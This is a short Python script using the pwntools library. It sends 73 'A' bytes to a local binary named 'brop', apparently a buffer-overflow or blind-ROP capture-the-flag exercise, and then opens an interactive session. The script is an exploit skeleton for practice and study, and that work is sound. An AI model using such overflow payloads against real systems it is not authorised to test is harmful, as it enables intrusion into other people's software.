from pwn import *
 

buf_size = 73

p  = b"A" * buf_size

proc = process('./brop')
proc.recvline()
proc.sendline(p)
proc.interactive()